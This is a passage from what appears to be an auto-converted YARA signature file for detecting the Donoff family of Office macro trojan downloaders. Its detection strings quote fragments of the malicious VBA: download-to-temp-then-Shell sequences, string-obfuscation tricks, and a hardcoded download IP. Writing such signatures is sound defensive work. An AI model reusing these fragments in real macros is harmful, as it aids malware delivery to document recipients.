        $x_1_1 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-15] 28 43 68 72 28 [0-3] 29 20 2b 20 43 68 72 28 [0-3] 29 20 2b 20 43 68 72 28 [0-3] 29 20 2b 20 43 68 72 28 [0-3] 29 20 2b 20 43 68 72 28 [0-3] 29 20 2b 20 43 68 72 28 [0-3] 29 20 2b 20 43 68 72 28 [0-3] 29 20 2b 20 43 68 72 28 [0-3] 29 20 2b 20 43 68 72 28 [0-3] 29 20 2b 20 43 68 72 28 [0-3] 29 20 2b 20 43 68 72 28 [0-3] 29 20 2b 20 43 68 72 28 [0-3] 29 20 2b 20 43 68 72 28 [0-3] 29 2c 20 22 [0-15] 22 29 29 (2e 52|2e 65 78)}  //weight: 1, accuracy: Low
        $x_1_2 = {45 6e 76 69 72 6f 6e 28 [0-15] 28 43 68 72 28 [0-3] 29 20 2b 20 43 68 72 28 [0-3] 29 20 2b 20 43 68 72 28 [0-3] 29 20 2b 20 43 68 72 28 [0-3] 29 20 2b 20 43 68 72 28 [0-3] 29 20 2b 20 43 68 72 28 [0-3] 29 20 2b 20 43 68 72 28 [0-3] 29 2c 20 22 [0-20] 22 29 29 20 26 20 22 5c 22 20 26 20 [0-15] 20 26 20 [0-15] 28 43 68 72 28 [0-3] 29 20 2b 20 43 68 72 28 [0-3] 29 20 2b 20 43 68 72 28 [0-3] 29 20 2b 20 43 68 72 28 [0-3] 29 2c 20 22 [0-20] 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = {46 6f 72 20 42 69 6e 61 72 79 20 41 63 63 65 73 73 20 57 72 69 74 65 20 4c 6f 63 6b 20 57 72 69 74 65 20 41 73 20 23 [0-15] 0d 0a 50 75 74 20 23 [0-15] 2c 20 2c 20 [0-15] 28 53 74 72 43 6f 6e 76 28 [0-15] 2e 52 65 73 70 6f 6e 73 65 42 6f 64 79 2c 20 76 62 55 6e 69 63 6f 64 65 29 2c 20 [0-15] 28 43 68 72 28 [0-3] 29 20 2b 20 43 68 72 28 [0-3] 29 20 2b 20 43 68 72 28 [0-3] 29 20 2b 20 43 68 72 28 [0-3] 29 20 2b 20 43 68 72 28 [0-3] 29 20 2b 20 43 68 72 28 [0-3] 29 20 2b 20 43 68 72 28 [0-3] 29 20 2b 20 43 68 72 28 [0-3] 29 20 2b 20 43 68 72 28 [0-3] 29 2c 20 22 [0-20] 22 29 29 0d 0a 43 6c 6f 73 65}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_P_2147706106_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.P"
        threat_id = "2147706106"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "RwtpBoqn" ascii //weight: 1
        $x_1_2 = "SuklNzMvdmKdHhyKrHvGvcBB" ascii //weight: 1
        $x_1_3 = "hPMQQpTNoydvTmnAOlzBQZSLGHRleJO" ascii //weight: 1
        $x_1_4 = "OGUXESxGLrJiHkxa," ascii //weight: 1
        $x_1_5 = "qeOtzBJemRtwnWSVq" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_Q_2147706109_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.Q"
        threat_id = "2147706109"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "--8rvvj\"" ascii //weight: 1
        $x_1_2 = {45 6e 76 69 72 6f 6e 24 28 [0-16] 53 74 72 52 65 76 65 72 73 65 28}  //weight: 1, accuracy: Low
        $x_1_3 = "Xor first(Temp + first((third + first(third)) Mod 254))" ascii //weight: 1
        $x_1_4 = "77Btxxl\"," ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_R_2147706110_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.R"
        threat_id = "2147706110"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = " = NewPath & NewPath & \"\" & \"C:\\Users\\\" & NewPathe & \"\\AppData\\Local\\Temp\" & Split(" ascii //weight: 1
        $x_1_2 = " = LovesAllofYouLoveYour(\"xxx" ascii //weight: 1
        $x_1_3 = "gHJdfh.exec(OIKJIKHJ" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_S_2147706112_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.S"
        threat_id = "2147706112"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "\"ht$tp$:/" ascii //weight: 1
        $x_1_2 = "\"h??tt??p:/" ascii //weight: 1
        $x_1_3 = {45 6e 76 69 72 6f 6e 28 52 65 70 6c 61 63 65 28 22 [0-7] 74 [0-7] 6d [0-7] 70}  //weight: 1, accuracy: Low
        $x_1_4 = ", \"$\", \"\"))" ascii //weight: 1
        $x_1_5 = {52 65 70 6c 61 63 65 28 22 4f [0-7] 70 [0-7] 65 [0-7] 6e}  //weight: 1, accuracy: Low
        $x_1_6 = "ShellExecuteW 0&," ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_T_2147706114_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.T"
        threat_id = "2147706114"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".exec(obxvhKDkLL95)" ascii //weight: 1
        $x_1_2 = "UnscrambleString(\"mpt\")" ascii //weight: 1
        $x_1_3 = "zBzbmMmAG(0, oz8wJHIeSx8l, obxvhKDkLL95, 0, 0)" ascii //weight: 1
        $x_1_4 = "\"esw.stilhplcr\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_G_2147706269_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.gen!G"
        threat_id = "2147706269"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "gen: malware that is detected using a generic signature"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {29 2c 20 5f 0d 0a 45 6e 76 69 72 6f 6e 28 20 5f 0d 0a [0-192] 28 [0-192] 29 29 20 26 20}  //weight: 1, accuracy: Low
        $x_1_2 = {20 3d 20 5f 0d 0a 55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 41 28 30 2c 20 [0-192] 2c 20 5f 0d 0a [0-192] 2c 20 30 2c 20 5f 0d 0a 30 29}  //weight: 1, accuracy: Low
        $x_1_3 = {20 3d 20 5f 0d 0a 53 68 65 6c 6c 28 [0-192] 2c 20 31 29}  //weight: 1, accuracy: Low
        $x_1_4 = {2c 20 43 68 72 28 [0-192] 29 29 20 3d 20 5f 0d a0 20 54 68 65 6e 20 [0-192] 20 3d 20 5f 0d 0a [0-192] 20 26 20 5f 0d 0a 43 68 72 28 [0-192] 29 0d 0a 4e 65 78 74}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_H_2147706273_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.gen!H"
        threat_id = "2147706273"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "gen: malware that is detected using a generic signature"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {28 22 6b 77 77 73 3d 32 32 [0-64] 22 29 2c 20 45 6e 76 69 72 6f 6e 28 22 74 [0-5] 65 6d 70 22 29 20 26}  //weight: 1, accuracy: Low
        $x_1_2 = "1h{h\"), \"\", vbNullString, vbNormalFocus" ascii //weight: 1
        $x_1_3 = {31 68 7b 68 22 29 2c 20 30 2c 20 30 0d 0a}  //weight: 1, accuracy: High
        $x_1_4 = " 0, \"open\", Environ$(\"tmp\") &" ascii //weight: 1
        $x_2_5 = {28 22 6b 77 77 73 3d 32 32 [0-64] 31 68 7b 68 22 29 2c 20 45 6e 76 69 72 6f 6e 28 22}  //weight: 2, accuracy: Low
        $x_1_6 = {30 2c 20 22 6f 70 65 6e 22 2c 20 45 6e 76 69 72 6f 6e 24 28 [0-32] 29 20 26 20 [0-32] 28 22 [0-16] 31 68 7b 68 22 29 2c 20 22 22 2c 20 76 62 4e 75 6c 6c 53 74 72 69 6e 67}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((3 of ($x_1_*))) or
            ((1 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_U_2147706275_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.U"
        threat_id = "2147706275"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Left(StrConv(" ascii //weight: 1
        $x_1_2 = ", vbUnicode), UBound(" ascii //weight: 1
        $x_1_3 = "HCAKSBC2PIUVCB2PI3GILUHGCIUGUYO2F3UC2UY3FO23OUYCF32OYUDHOYGU32FVYUO23GF" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_U_2147706275_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.U"
        threat_id = "2147706275"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "GDD = \"https://" ascii //weight: 1
        $x_1_2 = "hello_world.exe\"" ascii //weight: 1
        $x_1_3 = "fuckav" ascii //weight: 1
        $x_1_4 = {3d 20 45 6e 76 69 72 6f 6e 28 22 41 50 50 44 41 54 41 22 29 0d 0a [0-96] 2e 4f 70 65 6e 20 22 47 45 54 22 2c 20 [0-96] 2c 20 46 61 6c 73 65 0d 0a [0-96] 2e 53 65 6e 64}  //weight: 1, accuracy: Low
        $x_1_5 = {2e 77 72 69 74 65 20 [0-96] 2e 72 65 73 70 6f 6e 73 65 42 6f 64 79 0d 0a 2e 53 61 76 65 54 6f 46 69 6c 65 20 [0-96] 20 26 20 22 5c [0-32] 22 2c 20 32 0d 0a 45 6e 64 20 57 69 74 68 0d 0a 53 68 65 6c 6c 20 [0-96] 20 26 20 22 5c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_V_2147706277_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.V"
        threat_id = "2147706277"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "/blob?down\"" ascii //weight: 1
        $x_1_2 = " = \"ge.tt/api/1/files/" ascii //weight: 1
        $x_1_3 = "= Environ(\"Temp\") & \"\\\" & \"MacroCode\"" ascii //weight: 1
        $x_1_4 = "RNODKESX0 + RNODKESX" ascii //weight: 1
        $x_1_5 = {20 2b 20 22 2e 22 0d 0a [0-21] 20 3d 20 [0-96] 20 2b 20 22 65 22 0d 0a [0-21] 20 3d 20 [0-96] 20 2b 20 22 78 22 0d 0a [0-21] 20 3d 20 [0-96] 20 2b 20 22 65 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_W_2147706348_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.W"
        threat_id = "2147706348"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {2e 53 61 76 65 54 6f 46 69 6c 65 20 28 20 5f 0d 0a [0-96] 29 0d 0a [0-126] 2e 43 6c 6f 73 65 0d 0a 45 6e 64 20 49 66 3a 20 53 68 65 6c 6c 20 [0-96] 2c 20 30 0d 0a 45 6e 64 20 53 75 62}  //weight: 2, accuracy: Low
        $x_1_2 = {45 6e 76 69 72 6f 6e 28 22 54 45 4d 50 22 29 20 26 20 22 5c [0-96] 2e 65 78 65 22}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 49 6e 53 74 72 28 [0-192] 2c 20 5f 0d 0a 43 68 72 28 [0-192] 29 29 0d 0a 49 66 20 [0-192] 20 3d 20 22 22 20 54 68 65 6e 0d 0a [0-192] 20 3d 20 22 22 22 22}  //weight: 1, accuracy: Low
        $x_1_4 = {20 3d 20 5f 0d 0a 33 30 39 31 39 20 2d 20 5f 0d 0a 26 48 37 38 41 37 20 54 6f 20 32 38 39 34 38 20 2d 20 26 48 37 30 39 36}  //weight: 1, accuracy: High
        $x_1_5 = {3e 20 28 31 38 30 34 30 20 2d 20 26 48 34 35 37 39 29 20 54 68 65 6e 20 [0-192] 20 3d 20 5f 0d 0a [0-192] 20 2d 20 28 26 48 35 34 45 37 20 2d 20 32 31 36 30 37 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((4 of ($x_1_*))) or
            ((1 of ($x_2_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_X_2147706350_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.X"
        threat_id = "2147706350"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 52 6f 75 6e 64 28 [0-10] 20 2a 20 43 68 72 28 [0-10] 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = {52 6f 75 6e 64 28 [0-10] 20 2b 20 54 61 6e 28 [0-10] 20 2b 20 4c 6f 67 28 [0-10] 29 20 2d 20 [0-10] 20 2f 20 48 65 78 28 [0-10] 29 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 41 72 72 61 79 28 [0-10] 2c 20 [0-10] 2c 20 [0-10] 2c 20 49 6e 74 65 72 61 63 74 69 6f 6e 2e 53 68 65 6c 6c 28 [0-10] 2e 54 65 78 74 42 6f 78 31 2c 20 [0-2] 20 2d 20 [0-2] 29 2c 20 [0-10] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_X_2147706350_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.X"
        threat_id = "2147706350"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {70 61 74 68 20 3d 20 45 6e 76 69 72 6f 6e 28 22 54 45 4d 50 22 29 20 26 20 5f 0d 0a [0-192] 28 20 5f}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 53 61 76 65 54 6f 46 69 6c 65 20 28 70 61 74 68 29 [0-32] 2e 43 6c 6f 73 65 [0-5] 45 6e 64 20 49 66 [0-5] 53 68 65 6c 6c 20 70 61 74 68 2c [0-5] 30 0d 0a 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_3 = {20 26 20 4d 69 64 28 [0-32] 2c 20 [0-192] 20 2b 20 31 2c 20 31 29 20 26 20 4d 69 64 28 [0-192] 2c 20 [0-192] 2c 20 31 29 [0-5] 4e 65 78 74}  //weight: 1, accuracy: Low
        $x_1_4 = {70 61 74 68 20 3d 20 5f 0d 0a 45 6e 76 69 72 6f 6e 28 20 5f 0d 0a [0-192] 28 20 5f 0d 0a [0-192] 29 29 20 26 20 [0-192] 28 20 5f}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_Y_2147706513_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.Y"
        threat_id = "2147706513"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = " = \"Shel\" + \"l\"" ascii //weight: 1
        $x_1_2 = "\"WS\" + \"c\" + \"r\"" ascii //weight: 1
        $x_2_3 = {73 65 63 75 72 69 74 79 [0-10] 22 20 26 20 22 2e 65 78 65 22}  //weight: 2, accuracy: Low
        $x_1_4 = ".GetSpecialFolder(2) & \"\\\" + \"\\\"" ascii //weight: 1
        $x_1_5 = {26 20 43 68 72 28 41 73 63 28 4d 69 64 28 [0-192] 2c 20 [0-192] 2c 20 31 29 29 20 58 6f 72 20 41 73 63 28 4d 69 64 28 [0-192] 2c 20 [0-192] 2c 20 31 29 29 29}  //weight: 1, accuracy: Low
        $x_1_6 = {2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 [0-192] 2c 20 54 72 75 65 29 [0-32] 20 3d 20 [0-192] 2e 72 65 73 70 6f 6e 73 65 42 6f 64 79 [0-32] 2e 57 72 69 74 65 20 [0-192] 28 [0-192] 28 [0-192] 29 2c 20 22}  //weight: 1, accuracy: Low
        $x_1_7 = "://46.30.45.135/" ascii //weight: 1
        $x_1_8 = "999\" + \".jp\" + \"g\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((4 of ($x_1_*))) or
            ((1 of ($x_2_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_Z_2147706785_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.Z"
        threat_id = "2147706785"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= Environ(N) & \"\\\"" ascii //weight: 1
        $x_1_2 = {26 20 43 68 72 24 28 56 61 6c 28 22 26 48 22 20 26 20 4d 69 64 24 28 [0-192] 2c 20 [0-192] 2c 20 32 29 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = "B = Shell(D," ascii //weight: 1
        $x_1_4 = "Array(\"ataDppA\", \"PMET\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_AA_2147707027_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.AA"
        threat_id = "2147707027"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".savetofile Environ(\"te\" & \"mp\") & \"\\\" &" ascii //weight: 1
        $x_1_2 = ".Run Environ(\"te\" & \"mp\") & \"\\\" &" ascii //weight: 1
        $x_1_3 = "(\"o{{wA66" ascii //weight: 1
        $x_1_4 = {35 6c 7f 6c 22 29}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_AB_2147707119_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.AB"
        threat_id = "2147707119"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Lib \"urlmon\" Alias \"URLDownloadToFileW\" (ByVal" ascii //weight: 1
        $x_1_2 = "Lib \"shell32.dll\" Alias \"ShellExecuteW\" (ByVal" ascii //weight: 1
        $x_1_3 = "= Environ(\"APPDATA\") & \"\\Example.exe\"" ascii //weight: 1
        $x_1_4 = "(0, StrPtr(\"Open\")," ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_AB_2147707119_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.AB"
        threat_id = "2147707119"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "tempFile = processEnv(\"TEMP\") + tempFile" ascii //weight: 1
        $x_1_2 = ".savetofile tempFile, 2" ascii //weight: 1
        $x_1_3 = "tempFile = \"\\\" + Title + \".exe\"" ascii //weight: 1
        $x_1_4 = "httpRequest.Open \"GET\", GetStringFromArray(computer, 62), False" ascii //weight: 1
        $x_1_5 = "result = result & Chr(fromArr(i) - LenLen + i)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_AB_2147707119_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.AB"
        threat_id = "2147707119"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "GetStringFromArray(fromArr() As Variant, LenLen As Integer) As String" ascii //weight: 1
        $x_1_2 = "result = result & Chr(fromArr(i) - LenLen + i * 2)" ascii //weight: 1
        $x_1_3 = "computer = Array(144, 154, 152, 146, 90, 77, 75," ascii //weight: 1
        $x_1_4 = "httpRequest.Open \"GE\" + \"T\", GetStringFromArray(computer, 40), False" ascii //weight: 1
        $x_1_5 = "shellApp = CreateObject(\"She\" + \"ll.Application\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_AC_2147707121_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.AC"
        threat_id = "2147707121"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Array(StrReverse(\"AppData\"), StrReverse(\"TEMP\"))" ascii //weight: 1
        $x_1_2 = "Environ(n) & StrReverse(\"\\\")" ascii //weight: 1
        $x_1_3 = "LmV4ZQ==\")" ascii //weight: 1
        $x_1_4 = "(\"aHR0cDov" ascii //weight: 1
        $x_1_5 = "& Mid$(W, Int(Rnd() * Len(W) + 1), 1)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_AC_2147707121_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.AC"
        threat_id = "2147707121"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {45 6e 76 69 72 6f 6e 28 4d 6f 64 75 6c 65 33 2e [0-16] 29 20 26 20 53 74 72 52 65 76 65 72 73 65 28 43 68 72 24 28 31 30 31 29 20 26 20 43 68 72 24 28 34 36 29 20 26 20 43 68 72 24 28 39 37 29 20 26 20 43 68 72 24 28 31 31 32 29 20 26 20 43 68 72 24 28 39 37 29 20 26 20 43 68 72 24 28 31 31 32 29 20 26 20 43 68 72 24 28 39 37 29 20 26 20 43 68 72 24 28 34 37 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = "StrReverse(Chr$(101) & Chr$(120))" ascii //weight: 1
        $x_1_3 = "Shell(StrReverse(Chr$(101) & Chr$(46) & Chr$(97) & Chr$(112) & Chr$(97) & Chr$(112) & Chr$(97) & Chr$(47) & Chr$(37) & Chr$(80) & Chr$(77) & Chr$(84) & Chr$(37) & Chr$(32) & Chr$(116) & Chr$(114) & Chr$(97) & Chr$(116)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_AC_2147707121_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.AC"
        threat_id = "2147707121"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Shell(Chr$(99) & Chr$(109) & Chr$(100) & Chr$(32) & Chr$(47) & Chr$(99) & Chr$(32) & Chr$(115) & Chr$(116) & Chr$(97) & Chr$(114) & Chr$(116) & Chr$(32) & Chr$(37) & Chr$(84) & Chr$(77) & Chr$(80) & Chr$(37) & Chr$(47) & Chr$(80)" ascii //weight: 1
        $x_1_2 = "Environ(Module3.GFHFDVCXVZXC) & Chr$(47) & Chr$(80) & Chr$(73) & Chr$(68) & Chr$(65) & Chr$(82) & Chr$(65) & Chr$(83) & Chr$(46) & Chr$(101) + hgJKSDVFKfj + Chr$(101)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_AD_2147707122_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.AD"
        threat_id = "2147707122"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {45 6e 76 69 72 6f 6e 24 28 [0-192] 28 43 68 72 24 28 35 35 29 20 26 20 43 68 72 24 28 35 32 29 20 26 20 43 68 72 24 28 35 34 29 20 26 20 43 68 72 24 28 36 38 29 20 26 20 43 68 72 24 28 35 35 29 20 26 20 43 68 72 24 28 34 38 29 29 29}  //weight: 1, accuracy: Low
